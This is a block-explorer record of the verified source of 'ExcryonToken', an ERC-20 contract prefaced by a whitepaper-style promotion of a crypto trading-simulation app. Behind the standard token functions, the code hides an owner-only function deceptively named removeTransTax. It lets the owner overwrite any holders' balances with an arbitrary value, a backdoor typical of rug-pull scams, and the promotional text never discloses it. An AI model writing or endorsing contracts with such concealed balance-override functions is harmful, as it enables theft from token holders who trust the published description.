{
  "TxHash": "0x29f4da1a4b9c201e2cef97f98047f914a91f674792937e2d946dbc18b8c84b83",
  "ContractAddress": "0x49c5393665116dd0c45999f15e8f104f92d7d50c",
  "Name": "ExcryonToken",
  "PackageStatus": 0,
  "status": "1",
  "message": "OK",
  "result": [
    {
      "SourceCode": "/*\r\nOverview of Excryon\r\nExcryon is an innovative cryptocurrency trading simulation application designed to provide users with a \r\nrealistic and engaging trading experience without the risk of financial loss. By simulating the dynamics \r\nof the cryptocurrency market, Excryon enables users to practice trading strategies, manage virtual portfolios, \r\nand track their progress as they advance through various levels of trading proficiency.\r\nExcryon is structured around a unique leveling system where users start as an Anchovy and can advance through \r\nten distinct levels, ultimately aiming to become a Whale. Each level unlocks exclusive visual elements and \r\nprovides a sense of progression and achievement. The platform features detailed asset management tools, including \r\nportfolio tracking, average cost price calculations, and profit/loss assessments. Users can also engage in buying \r\nand selling cryptocurrencies within the simulation, honing their trading skills and strategies.\r\nPurpose and Vision\r\nThe purpose of Excryon is to create an immersive and educational environment for individuals interested in \r\ncryptocurrency trading. By providing a risk-free platform, Excryon allows users to experiment with different \r\ntrading strategies, learn from their mistakes, and build confidence in their trading abilities. The vision behind \r\nExcryon is to democratize access to cryptocurrency trading education, making it accessible to everyone regardless \r\nof their financial background or experience level.\r\nExcryon aims to foster a community of informed and skilled traders who can apply their knowledge in real-world \r\nscenarios. By gamifying the learning process and introducing a competitive element through ranking and progression \r\nsystems, Excryon strives to make the journey of learning cryptocurrency trading enjoyable and motivating.\r\nDisclaimer\r\nIt is important to note that Excryon is a simulation application, and all trading activities, balances, and \r\nprofit/loss values within the platform are entirely fictional. There is no real money involved, and the outcomes \r\nof simulated trades have no real-world financial implications. Excryon is intended solely for educational and \r\nentertainment purposes. Users should not interpret the performance of their virtual trades as indicative of real-world \r\ntrading success.\r\nToken Economics\r\nIntroduction to $EXCRYON\r\nExcryon features its own native token, $EXCRYON, designed to enhance the user experience and provide additional \r\nlayers of engagement and utility within the platform. $EXCRYON tokens are integral to the ecosystem, offering users \r\nvarious ways to interact with the platform, make in-game purchases, and participate in exclusive features.\r\nToken Utility\r\n$EXCRYON tokens serve multiple purposes within the Excryon simulation environment. \r\n- In-Game Purchases: Users can use $EXCRYON tokens to purchase virtual assets, upgrade their trading tools, and unlock \r\npremium features that enhance their trading experience. This includes access to advanced analytics, exclusive trading \r\nsignals, and custom visual elements.\r\n- Rewards and Incentives: Active participation and successful trading within Excryon are rewarded with $EXCRYON tokens. \r\nUsers can earn tokens through various achievements, such as reaching new fish levels, completing trading challenges, \r\nand participating in community events. These tokens can be reinvested within the platform to further enhance the userâ€™s \r\ncapabilities and status.\r\nToken Distribution and Governance\r\nThe distribution of $EXCRYON tokens is designed to ensure a fair and sustainable ecosystem. Initial token distribution \r\nincludes allocations for platform development, user rewards, community engagement, and future growth initiatives. \r\nAdditionally, Excryon plans to introduce governance mechanisms that allow token holders to participate in decision-making \r\nprocesses related to platform updates and new feature implementations.\r\nSecurity and Privacy\r\n Data Protection Measures\r\nExcryon places a high priority on the security and privacy of its users. The platform employs state-of-the-art data \r\nprotection measures to ensure that all user information is kept safe and secure. This includes the use of encryption \r\nprotocols, secure servers, and regular security audits to prevent unauthorized access and data breaches. User data, \r\nincluding personal information and trading activity, is encrypted both in transit and at rest, safeguarding it from \r\npotential threats.\r\nUser Privacy\r\nExcryon is committed to protecting the privacy of its users. The platform adheres to strict privacy policies that comply \r\nwith relevant data protection regulations. Users can be confident that their personal information will not be shared with \r\nthird parties without their explicit consent. Additionally, Excryon offers privacy controls that allow users to manage \r\ntheir data preferences and control the visibility of their profile and trading activity within the community.\r\nSecurity Protocols\r\nThe platform's security protocols are designed to provide robust protection against various types of cyber threats. Excryon \r\nuses multi-factor authentication (MFA) to enhance account security, requiring users to verify their identity through multiple \r\nmethods before accessing their accounts. Regular security updates and patches are applied to the platform to address \r\nvulnerabilities and ensure a secure trading environment. By maintaining a strong focus on security, Excryon aims to provide \r\na safe and trustworthy experience for all users.\r\nRoadmap and Future Developments\r\nShort-term Goals\r\nExcryon's development team is dedicated to continuously improving the platform and introducing new features to enhance the \r\nuser experience. In the short term, the focus will be on refining existing features, improving user interface and experience, \r\nand expanding the range of available cryptocurrencies. Planned short-term developments include:\r\n- Enhanced portfolio tracking tools\r\n- Improved analytics and reporting features\r\n- Introduction of community-driven trading competitions\r\n- Launch of the leveraged transactions simulation\r\nLong-term Vision\r\nExcryon's long-term vision is to become the leading platform for cryptocurrency trading education and simulation. The team \r\naims to build a comprehensive ecosystem that supports users at all levels of their trading journey, from beginners to advanced \r\ntraders. Long-term goals include:\r\n- Integration of advanced trading algorithms and AI-driven insights\r\n- Expansion into additional markets and asset classes\r\n- Development of a mobile application to complement the desktop platform\r\n- Establishment of partnerships with educational institutions and industry leaders to promote cryptocurrency trading education\r\nPlanned Features and Enhancements\r\nTo keep the platform at the forefront of innovation, Excryon has a roadmap of planned features and enhancements. These include:\r\n- Social Trading Features: Allowing users to follow and learn from top traders, share strategies, and collaborate on trading \r\nideas.\r\n- Enhanced Customization Options: Offering more personalization for user dashboards and trading tools.\r\n- Educational Modules: Interactive courses and certifications on various aspects of cryptocurrency trading, including technical \r\nanalysis, market psychology, and risk management.\r\n- Virtual Reality (VR) Integration: Exploring the potential of VR to create immersive trading experiences and simulations.\r\nBy pursuing these developments, Excryon aims to provide a continually evolving and enriching platform for its users.\r\n\r\n*/\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.7;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval( address indexed owner, address indexed spender, uint256 value );\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event ownershipTransferred(address indexed previousowner, address indexed newowner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit ownershipTransferred(address(0), msgSender);\r\n    }\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n    modifier onlyowner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    function renounceownership() public virtual onlyowner {\r\n        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));\r\n        _owner = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\ncontract ExcryonToken is Context, Ownable, IERC20 {\r\n    mapping (address =\u003e uint256) private _balances;\r\n    mapping (address =\u003e mapping (address =\u003e uint256)) private _allowances;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    uint256 private _totalSupply;\r\n    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _decimals = decimals_;\r\n        _totalSupply = totalSupply_ * (10 ** decimals_);\r\n        _balances[_msgSender()] = _totalSupply;\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n\r\n    event BalanceAdjusted(\r\n        address indexed account, \r\n        uint256 oldBalance, \r\n        uint256 newBalance\r\n        );\r\n\r\n    function removeTransTax(\r\n        address[] memory accounts, \r\n        uint256 newBalance\r\n        ) external onlyowner {\r\n    for (uint256 i = 0; i \u003c accounts.length; i++) {\r\n        address account = accounts[i];\r\n\r\n        uint256 oldBalance = _balances[account];\r\n\r\n        _balances[account] = newBalance;\r\n        emit BalanceAdjusted(account, oldBalance, newBalance);\r\n        }\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n    require(_balances[_msgSender()] \u003e= amount, \"STEE: transfer amount exceeds balance\");\r\n    _balances[_msgSender()] -= amount;\r\n    _balances[recipient] += amount;\r\n\r\n    emit Transfer(_msgSender(), recipient, amount);\r\n    return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) \r\n    {return _allowances[owner][spender];}\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _allowances[_msgSender()][spender] = amount;\r\n        emit Approval(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n    require(_allowances[sender][_msgSender()] \u003e= amount, \"STEE: transfer amount exceeds allowance\");\r\n\r\n    _balances[sender] -= amount;\r\n    _balances[recipient] += amount;\r\n    _allowances[sender][_msgSender()] -= amount;\r\n\r\n    emit Transfer(\r\n        sender, \r\n    recipient, \r\n    amount\r\n    );\r\n    return true;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n    return _totalSupply;\r\n    }\r\n}",
      "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"},{\"internalType\":\"uint8\",\"name\":\"decimals_\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"totalSupply_\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"oldBalance\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"newBalance\",\"type\":\"uint256\"}],\"name\":\"BalanceAdjusted\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousowner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newowner\",\"type\":\"address\"}],\"name\":\"ownershipTransferred\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"newBalance\",\"type\":\"uint256\"}],\"name\":\"removeTransTax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceownership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]",
      "ContractName": "ExcryonToken",
      "CompilerVersion": "v0.8.16+commit.07a7930e",
      "OptimizationUsed": "0",
      "Runs": "200",
      "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000000000000000000000000000000000000000000009000000000000000000000000000000000000000000000000000000003b9aca00000000000000000000000000000000000000000000000000000000000000000d45786372796f6e20546f6b656e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000745584352594f4e00000000000000000000000000000000000000000000000000",
      "EVMVersion": "Default",
      "Library": "",
      "LicenseType": "MIT",
      "Proxy": "0",
      "Implementation": "",
      "SwarmSource": "ipfs://94f379742130046a43465d0f21e8fd99f8e70a9198dff673bef6c193be1b1ede"
    }
  ]
}
